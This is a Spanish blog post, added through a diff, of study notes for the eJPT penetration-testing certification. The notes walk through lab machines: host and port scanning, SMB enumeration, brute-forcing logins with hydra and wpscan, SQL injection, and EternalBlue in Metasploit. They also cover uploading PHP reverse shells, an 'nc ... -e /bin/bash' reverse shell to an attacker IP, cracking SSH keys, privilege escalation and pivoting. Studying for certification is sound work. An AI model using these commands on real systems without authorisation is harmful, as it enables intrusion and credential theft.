@@ -1,0 +1,321 @@
+---
+layout: post
+title:  "eJPT"
+date:   2026-02-05 14:17:18 +0100
+categories: jekyll update
+author: mrallfredii
+tags: ejpt
+---
+
+## 1. Saber la estructura de red y maquinas conectadas
+
+ip -c a para saber nuestra ip
+
+barrido con ping icmp para detectar maquinas conectadas: nmap -sn ip de la red/24
+
+Hacer el mapa de red con drawio
+
+## 2. Hacer escaneo de puertos a las maquinas econtradas con nmap
+
+nmap -sS —min-rate 5000 -p- —open ips de las maquinas -oN tcp-scan.txt
+
+para sacar las lineas de puertos para analizar mejor el output: regex con grep
+
+grep ‘^[0-9]’ tcp-scan.txt
+
+## 3. Enumerar los servicios que corren cada maquina en cada puerto
+
+eliminar repetidos y ordenarlos
+
+nmap -p puertos —open -sC -sV ips -Pn -oN Full_scan.txt
+
+## 4. Maquina por maquina
+
+## 1
+
+Como la maquina 1 tiene servicio web (port 80 con servidor apache)
+
+- revisar source code
+- fuerza de urls con dirbuster: usar dicc de palabras
+
+Como la maquina tiene el servicio SMB activo, analizamos:
+
+1. saber que clientes hay: smbclient -L ip vicitma -N
+2. Listar los permisos sobre los recurtsos smb: smbmap -H ip victima
+3. crackmapexec smb ip vicitma -u ‘’ -p ‘’ —shares
+4. enum4linux ip victima
+
+Con los clienes listados, seleccionamos el que podemos hackear (lo llamare con el nombre vul)
+
+smbclient //ip/vul
+
+Con esto tendrenmos acceso a una termianl int. de smb, donde podres listar dir, ficheros, etc.
+
+nos pueden dar info de siguientes pasos como passwords txt o similar y hacer dicc o usuarios de la maquina
+
+## Validar passwords encontrados en smb
+
+intentamos hacer login del user con varias paswwrods al cliente smb:
+
+crackmapexec smb ip vicitma -u user -p dict.txt
+
+smbmap -H ip vicitma -u user -p password
+
+smbclient ip vicima/user -U user 
+
+## Modifica /etc/hosts para que sirva com servidor dns
+
+Dentro de /etc/hosts
+
+ip victima         nombre referencia
+
+# CMS
+
+## Wordpress
+
+/wp-admin
+
+fuerza bruta de users:
+
+wpscan -U user - P dict —url htpp://ip/urls/
+
+scaneo:
+
+wpscan —url htpp://ip/urls/
+
+## Joomla
+
+joomscan
+
+## Drupal
+
+drupscan
+
+## Enumerar vulnabiridades
+
+searchsploit wordpress plugins
+
+identificar sploitt
+
+searchsploit  -x num del path
+
+## RSA
+
+para encontrar el rsa de un user:
+
+/home/user/.ssh/id_rsa
+
+## Crackear Password ssh
+
+ssh2john rsa > hashes.txt
+
+john —wordlist=/path dic hashes.txt
+
+## Escalar privilegios
+
+sudo -l
+
+cat /etc/crontab
+
+find / -perm -4000 -ls 2>/dev/null
+
+(-4000 flag suid)
+
+## 2
+
+puerto 80 abierto corriendo http con nginx
+
+En esa maquina lso recursos de la web no se estan enumerado/accediendo correctamente por parte del server/navegador: virual hosting
+
+Solucion: 
+
+mirar source code en lonk mirar donde apunta
+
+poner el dominio en /etc/hosts
+
+## Detectar vul en la web
+
+nikto -url  ip
+
+escaner de vul web: muestra dirs
+
+## Inicio de session
+
+- provar credenciales basicas: admin admin
+- sql injecion
+
+## SQL injection
+
+ex:
+
+‘ or 1=1;— -
+
+### Burp Suite
+
+intercerptar el trafico de inicio de session
+
+mirar hptt history y guardar rea resultado
+
+### SQL Map
+
+sqlmap -r respone_burp
+
+## Dentro de la BBDD
+
+explorar BDD: versions, file updates, etc.
+
+## Subir ficheros maliciosos
+
+PHP file malicioso: revshells.com
+
+PHPPerntestMonkey
+
+## Sanatizar resultados con nc
+
+tratamieno de la tty
+
+maquina victima: 
+
+script /dev/null -c bash
+
+nuestra maquina: 
+
+ssty raw -echo; fg
+
+stty -a: cogemos rows y columns
+
+maquina victima: 
+
+export SHELL=bash TERM=xterm
+
+stty rows num columns num
+
+Aqui ya podemos numerar red y varias cosas: 
+
+ip -c a
+
+cat /etc/passwd
+
+## Pivoting de user
+
+numeracion de archivos del sistema
+
+cd /var/www/html/traffic_offense/
+
+config.php
+
+etc.
+
+(repasar: sudo -l | binarios con permisos suid)
+
+## 3
+
+nmap -p445 —script=”smb-vuln-*” ip
+
+script que enuma vul de smb
+
+## Vuln
+
+metasploit
+
+hack eternalblue:
+
+sudo msfconsole
+
+search vul
+
+use num
+
+options
+
+set RHOSTS remote ip
+
+run
+
+## 4
+
+numeracion de direcoriso con fuerza bruta
+
+gui gobuser
+
+enumerar recursos smb
+
+crackmapexec smb ip victima -u ‘’ -p ‘’ —shares
+
+en -u poner info se usuarios
+
+smbclient //ip/infosmb -U user
+
+subir ficheros a smb: put
+
+## Subir ficheros aspx a smb web
+
+[revshells.com](http://revshells.com) ir a msfvenom
+
+## 5
+
+### enumerar credencailes con fuerza bruta
+
+hydra -l admin -P /dict ip victima http-post-form “/endpoint:username=^USER^&password=^PASS^:incorrect” -t 64 -F 
+
+3 datos de “::”:
+
+1. endpoint
+2. user and passwd
+3. string resposne http (enviar a repeteare de buirp)
+
+-F al encontrar credenciales validas, parar
+
+## Escalar privilegios
+
+sudo -l para ver que puede correr
+
+gtfobins da info de comandas para subir privilegios
+
+## Enumerar red de otra red
+
+## pivoting de red
+
+ss -natup
+
+ping sweep one liner
+
+msfconsole:
+
+necesiytamos shell meterpeter: recibir shell de metasplout y mejorar a meterpreter
+
+use multi/handler
+
+options
+
+maquina atacante
+
+maquina vicitma a ma atacante:
+
+nc ip atacantte 443 -e /bin/bash
+
+use shell_to_meterpreter
+
+## tecnicas de enrutamiento
+
+1. añadir rutas en metasploit: route (manual)
+
+route add segmento red/port session
+
+1. automaticamente: use multi/manage/autoroute
+
+1. nmap -sn ip/mask no sirve 
+
+1. use auxilary/scanner/portscan/tcp
+
+## Port forwarding
+
+con meterptrer
+
+portfwd add -l 8080 -p 80 -r ip remota
+
+## ssh
+
+fuerza brutra ssh metasploit
+
+use ssh_login
